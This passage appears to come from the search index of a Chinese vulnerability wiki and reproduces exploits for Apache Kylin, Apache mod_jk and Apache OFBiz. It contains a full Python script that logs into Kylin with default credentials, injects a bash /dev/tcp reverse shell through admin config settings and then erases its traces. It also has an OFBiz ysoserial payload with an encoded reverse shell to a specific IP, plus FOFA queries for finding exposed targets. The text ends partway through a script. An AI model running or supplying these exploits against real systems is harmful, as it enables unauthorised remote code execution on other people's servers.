POC\u5229\u7528\u524d\u63d0\u662f\u62e5\u6709\u8d26\u53f7\u5bc6\u7801\uff0c\u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801\u662f admin/KYLIN #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import base64 import sys def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Kylin <= 3.0.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 CVE-2020-1956 \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:7070 \\033 [0m' ) print ( '+ \\033 [36mLogin >>> admin:KYLIN(\u683c\u5f0f\u4e3aUser:Pass) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): login_url = target_url + \"/kylin/api/user/authentication\" user_pass = str ( input ( \" \\033 [35mPlease input User and Pass \\n Login >>> \\033 [0m\" )) Authorization = \"Basic \" + str (( base64 . b64encode ( user_pass . encode ( 'utf-8' ))), 'utf-8' ) headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Authorization\" : Authorization , \"Cookie\" : \"project=null\" } try : response = requests . post ( url = login_url , headers = headers , timeout = 20 ) if \"password\" not in response . text : print ( \" \\033 [31m[x] \u8d26\u53f7\u5bc6\u7801\u51fa\u73b0\u9519\u8bef \\033 [0m\" ) sys . exit ( 0 ) else : print ( \" \\033 [32m[o] \u6210\u529f\u767b\u5f55\uff0c\u83b7\u5f97JSESSIONID\uff1a\" + response . cookies [ \"JSESSIONID\" ] + \" \\033 [0m\" ) return response . cookies [ \"JSESSIONID\" ], Authorization except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , cookie , IP , PORT , Authorization ): config_url = target_url + \"/kylin/api/admin/config\" key = [ \"kylin.tool.auto-migrate-cube.enabled\" , \"kylin.tool.auto-migrate-cube.src-config\" , \"kylin.tool.auto-migrate-cube.dest-config\" ] value = [ \"true\" , \"echo;bash -i >& /dev/tcp/ {} / {} 0>&1;echo\" . format ( IP , PORT ), \"shell\" ] headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Authorization\" : Authorization , \"Accept\" : \"application/json, text/plain, */*\" , \"Content-Type\" : \"application/json;charset=UTF-8\" , \"Pragma\" : \"no-cache\" , \"Cookie\" : \"project=null;JSESSIONID=\" + cookie } for i in range ( 0 , 3 ): data = \"\"\"{\"key\":\" %s \",\"value\":\" %s \"}\"\"\" % ( key [ i ], value [ i ]) try : response = requests . put ( url = config_url , headers = headers , data = data , timeout = 20 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5c06\" + key [ i ] + \"\u8bbe\u7f6e\u4e3a\" + value [ i ] + \" \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bbe\u7f6e\" + key [ i ] + \"\u4e3a\" + value [ i ] + \"\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_3 ( target_url , cookie ): print ( \" \\033 [35m[o] \u6b63\u5728\u53cd\u5f39shell...... \\033 [0m\" ) vuln_url = target_url + \"/kylin/api/cubes/kylin_sales_cube/learn_kylin/migrate\" headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Cookie\" : \"project=null;JSESSIONID=\" + cookie } try : response = requests . post ( url = vuln_url , headers = headers ) POC_4 ( target_url , cookie ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_4 ( target_url , cookie ): config_url = target_url + \"/kylin/api/admin/config\" key = [ \"kylin.tool.auto-migrate-cube.enabled\" , \"kylin.tool.auto-migrate-cube.src-config\" , \"kylin.tool.auto-migrate-cube.dest-config\" ] value = [ \"flase\" , \"echo;echo;echo\" , \"None\" ] headers = { \"User-Agent\" : \"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , \"Authorization\" : Authorization , \"Accept\" : \"application/json, text/plain, */*\" , \"Content-Type\" : \"application/json;charset=UTF-8\" , \"Pragma\" : \"no-cache\" , \"Cookie\" : \"project=null;JSESSIONID=\" + cookie } for i in range ( 0 , 3 ): data = \"\"\"{\"key\":\" %s \",\"value\":\" %s \"}\"\"\" % ( key [ i ], value [ i ]) try : response = requests . put ( url = config_url , headers = headers , data = data , timeout = 20 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6210\u529f\u5c06\" + key [ i ] + \"\u8bbe\u7f6e\u4e3a\" + value [ i ] + \" \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u8bbe\u7f6e\" + key [ i ] + \"\u4e3a\" + value [ i ] + \"\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) print ( \" \\033 [35m[o] \u6210\u529f\u6e05\u7406\u75d5\u8ff9 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) try : cookie , Authorization = POC_1 ( target_url ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) IP = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cIP >>> \\033 [0m\" )) PORT = str ( input ( \" \\033 [35m\u8bf7\u8f93\u5165\u76d1\u542cPORT >>> \\033 [0m\" )) POC_2 ( target_url , cookie , IP , PORT , Authorization ) POC_3 ( target_url , cookie )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-1956/#\u53c2\u8003\u6587\u7ae0","text":"Apache Kylin \u547d\u4ee4\u6ce8\u5165\u6f0f\u6d1e CVE-2020-1956 POC \u5206\u6790","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/","text":"Apache Kylin\u7684\u672a\u6388\u6743\u914d\u7f6e\u6cc4\u9732 CVE-2020-13937 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache Kylin\u6709\u4e00\u4e2arestful api\u4f1a\u5728\u6ca1\u6709\u4efb\u4f55\u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\u66b4\u9732\u914d\u7f6e\u4fe1\u606f\u3002 FOFA \u00b6 [!NOTE] app=\"APACHE-kylin\" \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apahche Kylin 2.x.x Apahche Kylin <= 3.1.0 Apahche Kylin 4.0.0-alpha \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u6839\u636e\u6f0f\u6d1e\u60c5\u62a5 \u6f0f\u6d1e\u5229\u7528POC\u4e3a http://xxx.xxx.xxx.xxx/kylin/api/admin/config \u6f0f\u6d1e\u68c0\u6d4bPOC \u00b6 import requests def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Kylin 2.x.x <= 3.1.0 Kylin 4.0.0-alpha \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2019-13937.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:9999 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : response = requests . get ( url = vuln_url , headers = headers , timeout = 20 ) if \"config\" in response . text : print ( \" \\033 [32m[o] \u5b58\u5728Apache Kylin\u7684\u672a\u6388\u6743\u914d\u7f6e\u6cc4\u9732 \\n [o] \u54cd\u5e94\u4e3a: \\n\\033 [0m\" , response . text ) else : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) Goby && POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Apache_Kylin_Unauthorized_configuration_disclosure.json \u53c2\u8003 \u00b6 CVE-2020-13937|Apache Kylin\u7684\u672a\u6388\u6743\u914d\u7f6e\u6cc4\u9732\u6f0f\u6d1e\uff0c\u817e\u8baf\u5b89\u5168\u5168\u9762\u652f\u6301\u68c0\u6d4b","title":"Apache Kylin \u672a\u6388\u6743\u914d\u7f6e\u6cc4\u9732 CVE-2020-13937"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/#apache-kylin\u7684\u672a\u6388\u6743\u914d\u7f6e\u6cc4\u9732-cve-2020-13937","text":"","title":"Apache Kylin\u7684\u672a\u6388\u6743\u914d\u7f6e\u6cc4\u9732 CVE-2020-13937"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache Kylin\u6709\u4e00\u4e2arestful api\u4f1a\u5728\u6ca1\u6709\u4efb\u4f55\u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\u66b4\u9732\u914d\u7f6e\u4fe1\u606f\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/#fofa","text":"[!NOTE] app=\"APACHE-kylin\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apahche Kylin 2.x.x Apahche Kylin <= 3.1.0 Apahche Kylin 4.0.0-alpha","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/#\u6f0f\u6d1e\u590d\u73b0","text":"\u6839\u636e\u6f0f\u6d1e\u60c5\u62a5 \u6f0f\u6d1e\u5229\u7528POC\u4e3a http://xxx.xxx.xxx.xxx/kylin/api/admin/config","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/#\u6f0f\u6d1e\u68c0\u6d4bpoc","text":"import requests def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Kylin 2.x.x <= 3.1.0 Kylin 4.0.0-alpha \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2019-13937.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:9999 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/kylin/api/admin/config\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : response = requests . get ( url = vuln_url , headers = headers , timeout = 20 ) if \"config\" in response . text : print ( \" \\033 [32m[o] \u5b58\u5728Apache Kylin\u7684\u672a\u6388\u6743\u914d\u7f6e\u6cc4\u9732 \\n [o] \u54cd\u5e94\u4e3a: \\n\\033 [0m\" , response . text ) else : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"\u6f0f\u6d1e\u68c0\u6d4bPOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Apache_Kylin_Unauthorized_configuration_disclosure.json","title":"Goby &amp;&amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Kylin/Apache%20Kylin%20%E6%9C%AA%E6%8E%88%E6%9D%83%E9%85%8D%E7%BD%AE%E6%B3%84%E9%9C%B2%20CVE-2020-13937/#\u53c2\u8003","text":"CVE-2020-13937|Apache Kylin\u7684\u672a\u6388\u6743\u914d\u7f6e\u6cc4\u9732\u6f0f\u6d1e\uff0c\u817e\u8baf\u5b89\u5168\u5168\u9762\u652f\u6301\u68c0\u6d4b","title":"\u53c2\u8003"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Mod_jk/Apache%20Mod_jk%20%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%20CVE-2018-11759/","text":"Apache Mod_jk \u8bbf\u95ee\u63a7\u5236\u6743\u9650\u7ed5\u8fc7 CVE-2018-11759 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache Tomcat JK\uff08mod_jk\uff09Connector\u662f\u7f8e\u56fd\u963f\u5e15\u5947\uff08Apache\uff09\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u6b3e\u4e3aApache\u6216IIS\u63d0\u4f9b\u8fde\u63a5\u540e\u53f0Tomcat\u7684\u6a21\u5757\uff0c\u7528\u4ee5\u4e3aApache\u6216IIS\u670d\u52a1\u5668\u63d0\u4f9b\u5904\u7406JSP/Servlet\u7684\u80fd\u529b\u3002 \u7531\u4e8ehttpd\u548cTomcat\u5728\u8def\u5f84\u5904\u7406\u89c4\u8303\u4e0a\u5b58\u5728\u5dee\u5f02\uff0c\u56e0\u6b64\u53ef\u4ee5\u7ed5\u8fc7Apache mod_jk Connector 1.2.0\u7248\u672c\u52301.2.44\u7248\u672c\u4e0a\u7531JkMount httpd\u6307\u4ee4\u6240\u5b9a\u4e49\u7aef\u70b9\u7684\u8bbf\u95ee\u63a7\u5236\u9650\u5236\u3002 \u5982\u679c\u4e00\u4e2a\u53ea\u6709\u53ea\u8bfb\u6743\u9650\u7684jkstatus\u7684\u63a5\u53e3\u53ef\u4ee5\u8bbf\u95ee\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u6709\u53ef\u80fd\u80fd\u591f\u516c\u5f00\u7531mod_jk\u6a21\u5757\u7ed9AJP\u63d0\u4f9b\u670d\u52a1\u7684\u5185\u90e8\u8def\u7531\u3002 \u5982\u679c\u4e00\u4e2a\u5177\u6709\u8bfb\u5199\u6743\u9650\u7684jkstatus\u63a5\u53e3\u53ef\u4f9b\u8bbf\u95ee\uff0c\u6211\u4eec\u5c31\u80fd\u901a\u8fc7\u4fee\u6539AJP\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u76f8\u5173\u914d\u7f6e\u6765\u52ab\u6301\u6216\u8005\u622a\u65ad\u6240\u6709\u7ecf\u8fc7mod_jk\u7684\u6d41\u91cf\uff0c\u53c8\u6216\u8005\u8fdb\u884c\u5185\u90e8\u7684\u7aef\u53e3\u626b\u63cf\u3002 \u5f71\u54cd\u7248\u672c \u00b6 [!NOTE] Apache Mod_jk Connector 1.2.0 ~ 1.2.44 \u73af\u5883\u642d\u5efa \u00b6 git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:80 \u6210\u529f\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee http://xxx.xxx.xxx.xxx/jkstatus \u663e\u793a\u65e0\u6743\u9650\u8bbf\u95ee Forbidden You don't have permission to access /jkstatus on this server. \u8bbf\u95ee http://xxx.xxx.xxx.xxx/jkstatus ; \u5373\u53ef\u7ed5\u8fc7 [!NOTE] \u6ce8\u610f\u662f\u5728url\u540e\u9762\u52a0\u4e0a\u4e86\u4e00\u4e2a;","title":"Apache Mod_jk \u8bbf\u95ee\u63a7\u5236\u6743\u9650\u7ed5\u8fc7 CVE-2018-11759"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Mod_jk/Apache%20Mod_jk%20%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%20CVE-2018-11759/#apache-mod_jk-\u8bbf\u95ee\u63a7\u5236\u6743\u9650\u7ed5\u8fc7-cve-2018-11759","text":"","title":"Apache Mod_jk \u8bbf\u95ee\u63a7\u5236\u6743\u9650\u7ed5\u8fc7 CVE-2018-11759"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Mod_jk/Apache%20Mod_jk%20%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%20CVE-2018-11759/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache Tomcat JK\uff08mod_jk\uff09Connector\u662f\u7f8e\u56fd\u963f\u5e15\u5947\uff08Apache\uff09\u8f6f\u4ef6\u57fa\u91d1\u4f1a\u7684\u4e00\u6b3e\u4e3aApache\u6216IIS\u63d0\u4f9b\u8fde\u63a5\u540e\u53f0Tomcat\u7684\u6a21\u5757\uff0c\u7528\u4ee5\u4e3aApache\u6216IIS\u670d\u52a1\u5668\u63d0\u4f9b\u5904\u7406JSP/Servlet\u7684\u80fd\u529b\u3002 \u7531\u4e8ehttpd\u548cTomcat\u5728\u8def\u5f84\u5904\u7406\u89c4\u8303\u4e0a\u5b58\u5728\u5dee\u5f02\uff0c\u56e0\u6b64\u53ef\u4ee5\u7ed5\u8fc7Apache mod_jk Connector 1.2.0\u7248\u672c\u52301.2.44\u7248\u672c\u4e0a\u7531JkMount httpd\u6307\u4ee4\u6240\u5b9a\u4e49\u7aef\u70b9\u7684\u8bbf\u95ee\u63a7\u5236\u9650\u5236\u3002 \u5982\u679c\u4e00\u4e2a\u53ea\u6709\u53ea\u8bfb\u6743\u9650\u7684jkstatus\u7684\u63a5\u53e3\u53ef\u4ee5\u8bbf\u95ee\u7684\u8bdd\uff0c\u90a3\u4e48\u5c31\u6709\u53ef\u80fd\u80fd\u591f\u516c\u5f00\u7531mod_jk\u6a21\u5757\u7ed9AJP\u63d0\u4f9b\u670d\u52a1\u7684\u5185\u90e8\u8def\u7531\u3002 \u5982\u679c\u4e00\u4e2a\u5177\u6709\u8bfb\u5199\u6743\u9650\u7684jkstatus\u63a5\u53e3\u53ef\u4f9b\u8bbf\u95ee\uff0c\u6211\u4eec\u5c31\u80fd\u901a\u8fc7\u4fee\u6539AJP\u7684\u914d\u7f6e\u6587\u4ef6\u4e2d\u76f8\u5173\u914d\u7f6e\u6765\u52ab\u6301\u6216\u8005\u622a\u65ad\u6240\u6709\u7ecf\u8fc7mod_jk\u7684\u6d41\u91cf\uff0c\u53c8\u6216\u8005\u8fdb\u884c\u5185\u90e8\u7684\u7aef\u53e3\u626b\u63cf\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Mod_jk/Apache%20Mod_jk%20%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%20CVE-2018-11759/#\u5f71\u54cd\u7248\u672c","text":"[!NOTE] Apache Mod_jk Connector 1.2.0 ~ 1.2.44","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Mod_jk/Apache%20Mod_jk%20%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%20CVE-2018-11759/#\u73af\u5883\u642d\u5efa","text":"git clone https://github.com/immunIT/CVE-2018-11759.git docker-conpose up -d \u8bbf\u95ee http://xxx.xxx.xxx.xxx:80 \u6210\u529f\u5373\u53ef","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Mod_jk/Apache%20Mod_jk%20%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%20CVE-2018-11759/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee http://xxx.xxx.xxx.xxx/jkstatus \u663e\u793a\u65e0\u6743\u9650\u8bbf\u95ee Forbidden You don't have permission to access /jkstatus on this server. \u8bbf\u95ee http://xxx.xxx.xxx.xxx/jkstatus ; \u5373\u53ef\u7ed5\u8fc7 [!NOTE] \u6ce8\u610f\u662f\u5728url\u540e\u9762\u52a0\u4e0a\u4e86\u4e00\u4e2a;","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20OFBiz/Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20CVE-2021-26295/","text":"Apache OFBiz rmi\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e CVE-2021-26295 \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 OFBiz\u662f\u57fa\u4e8eJava\u7684Web\u6846\u67b6\uff0c\u5305\u62ec\u5b9e\u4f53\u5f15\u64ce\uff0c\u670d\u52a1\u5f15\u64ce\u548c\u57fa\u4e8e\u5c0f\u90e8\u4ef6\u7684UI\u3002 \u8fd1\u65e5\uff0cApache OFBiz\u5b98\u65b9\u53d1\u5e03\u5b89\u5168\u66f4\u65b0\u3002Apache OFBiz \u5b58\u5728RMI\u53cd\u5e8f\u5217\u5316\u524d\u53f0\u547d\u4ee4\u6267\u884c\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u6f0f\u6d1e\u6765\u6210\u529f\u63a5\u7ba1Apache OFBiz\uff0c\u5efa\u8bae\u76f8\u5173\u7528\u6237\u5c3d\u5feb\u6d4b\u8bd5\u6f0f\u6d1e\u4fee\u590d\u7684\u7248\u672c\u5e76\u53ca\u65f6\u5347\u7ea7\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache OFBiz < 17.12.06 FOFA \u00b6 [!NOTE] app=\"Apache_OFBiz\" \u73af\u5883\u642d\u5efa \u00b6 docker run -d -p 8000:8080 -p 8443:8443 opensourceknight/ofbiz \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528\u6587\u7ae0\u76ee\u5f55\u4e2d\u7684POC\u811a\u672c \u9a8c\u8bc1 Dnslog \u53cd\u5f39shell\u4f7f\u7528 ROME\u53cd\u5e8f\u5217\u5316\u94fe\u5c31\u884c\u4e86 java -jar ysoserial-0.0.6-SNAPSHOT-all.jar ROME \"bash -c {echo,YmFzaCAtYyAnZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvLyA8JjEn}|{base64,-d}|{bash,-i}\" | xxd|cut -f 2,3,4,5,6,7,8,9 -d \" \"|tr -d ' '|tr -d '\\n' bash -c 'exec bash -i &>/dev/tcp/81.68.139.186/9999 <&1' base64\u52a0\u5bc6\u5199\u5165\u7136\u540e\u6267\u884c\u547d\u4ee4 \u7136\u540e\u628a\u6570\u636e\u586b\u5165\u4e0b\u9762\u7684 \u53cd\u5f39shell\u811a\u672c\u4e2d\u7684Hex_data\u53c2\u6570\u4e2d\u8fd0\u884c\u811a\u672c\u5373\u53ef\u53cd\u5f39shell \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u9700\u8981\u5c06POC\u653e\u5728\u4e0e ysoserial.jar \u540c\u4e00\u76ee\u5f55 \u4e00\u4e2a\u4e3a dnslog\u68c0\u6d4b\uff0c\u53e6\u4e00\u4e2a\u4e3a\u53cd\u5f39shell import requests import sys import sys import subprocess import binascii from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache OFBiz \\033 [0m' ) print ( '+ \\033 